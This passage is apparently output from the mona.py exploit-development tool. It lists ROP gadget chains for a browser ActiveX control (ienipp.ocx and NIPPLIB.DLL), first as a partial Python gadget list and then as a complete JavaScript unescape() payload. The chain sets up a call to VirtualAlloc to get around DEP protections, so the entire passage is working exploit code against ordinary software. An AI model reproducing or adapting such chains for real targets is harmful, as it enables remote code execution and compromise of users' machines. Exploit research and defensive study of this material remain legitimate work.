      0x41414141,  # Filler (compensate)
      0x41414141,  # Filler (compensate)
      0x41414141,  # Filler (compensate)
      0x5c075ffc,  # POP EDI # RETN [NIPPLIB.DLL] 
      0x41414141,  # Filler (RETN offset compensation)
      0x5c0bd4e3,  # RETN (ROP NOP) [NIPPLIB.DLL]
      0x5c076774,  # POP ESI # RETN [NIPPLIB.DLL] 
      0x5c01bbc0,  # JMP [EAX] [NIPPLIB.DLL]
      0x1004b13f,  # POP EAX # RETN [ienipp.ocx] 
      0x765c17f0,  # ptr to &VirtualAlloc() (skipped module criteria, check if pointer is reliable !) [IAT kernel32.dll]
      0x5c0839e1,  # PUSHAD # RETN [NIPPLIB.DLL] 
      0x5c0635b2,  # ptr to 'push esp # ret ' [NIPPLIB.DLL]
    ]
    return ''.join(struct.pack('<I', _) for _ in rop_gadgets)

  rop_chain = create_rop_chain()



*** [ JavaScript ] ***

  //rop chain generated with mona.py - www.corelan.be
  rop_gadgets = unescape(
    "%ue14f" + // 0x5c0ae14f : ,# POP EBP # RETN [NIPPLIB.DLL] 
    "%ue14f" + // 0x5c0ae14f : ,# skip 4 bytes [NIPPLIB.DLL]
    "%ub672%u1001" + // 0x1001b672 : ,# POP EAX # RETN [ienipp.ocx] 
    "%uffff%uffff" + // 0xffffffff : ,# Value to negate, will become 0x00000001
    "%ucfd3%u5c09" + // 0x5c09cfd3 : ,# NEG EAX # RETN [NIPPLIB.DLL] 
    "%ud949%u5c08" + // 0x5c08d949 : ,# XCHG EAX,EBX # RETN [NIPPLIB.DLL] 
    "%u58e9%u1003" + // 0x100358e9 : ,# POP EAX # RETN [ienipp.ocx] 
    "%ucffb%u7fff" + // 0x7fffcffb : ,# put delta into eax (-> put 0x00001000 into edx)
    "%u7001%u1001" + // 0x10017001 : ,# ADD EAX,80004005 # RETN 0x08 [ienipp.ocx] 
    "%ua72a%u5c06" + // 0x5c06a72a : ,# XCHG EAX,EDX # RETN 0x00 [NIPPLIB.DLL] 
    "%u4141%u4141" + // 0x41414141 : ,# Filler (RETN offset compensation)
    "%u4141%u4141" + // 0x41414141 : ,# Filler (RETN offset compensation)
    "%u4e21%u1001" + // 0x10014e21 : ,# POP EAX # RETN [ienipp.ocx] 
    "%uffc0%uffff" + // 0xffffffc0 : ,# Value to negate, will become 0x00000040
    "%ube26" + // 0x5c0abe26 : ,# NEG EAX # RETN [NIPPLIB.DLL] 
    "%ueab9%u1003" + // 0x1003eab9 : ,# XCHG EAX,ECX # POP EDI # ADD EAX,8 # POP ESI # POP EBP # RETN 0x04 [ienipp.ocx] 
    "%u4141%u4141" + // 0x41414141 : ,# Filler (compensate)
    "%u4141%u4141" + // 0x41414141 : ,# Filler (compensate)
    "%u4141%u4141" + // 0x41414141 : ,# Filler (compensate)
    "%u5ffc%u5c07" + // 0x5c075ffc : ,# POP EDI # RETN [NIPPLIB.DLL] 
    "%u4141%u4141" + // 0x41414141 : ,# Filler (RETN offset compensation)
    "%ud4e3%u5c0b" + // 0x5c0bd4e3 : ,# RETN (ROP NOP) [NIPPLIB.DLL]
    "%u6774%u5c07" + // 0x5c076774 : ,# POP ESI # RETN [NIPPLIB.DLL] 
    "%ubbc0%u5c01" + // 0x5c01bbc0 : ,# JMP [EAX] [NIPPLIB.DLL]
    "%ub13f%u1004" + // 0x1004b13f : ,# POP EAX # RETN [ienipp.ocx] 
    "%u17f0%u765c" + // 0x765c17f0 : ,# ptr to &VirtualAlloc() (skipped module criteria, check if pointer is reliable !) [IAT kernel32.dll]
    "%u39e1%u5c08" + // 0x5c0839e1 : ,# PUSHAD # RETN [NIPPLIB.DLL] 
    "%u35b2%u5c06" + // 0x5c0635b2 : ,# ptr to 'push esp # ret ' [NIPPLIB.DLL]
    ""); //  : 


--------------------------------------------------------------------------------------------------

